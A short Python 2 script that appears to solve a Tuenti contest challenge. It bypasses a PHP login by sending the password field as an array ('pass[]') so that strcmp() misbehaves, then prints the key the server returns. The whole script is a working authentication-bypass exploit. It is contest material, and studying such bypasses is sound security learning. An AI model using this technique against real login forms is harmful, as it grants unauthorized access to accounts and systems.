# -*- coding: utf-8 -*-
import urllib

#pass an array as password, strcmp() will get confused =)
data = urllib.urlencode([('key', 'f9b8456a539758c37e415778d5d7a56340e41bcd'), ('pass[]',[])])
f = urllib.urlopen('http://pauth.contest.tuenti.net/',data)
s = f.read()
print s[s.find('your key: ')+len('your key: '):]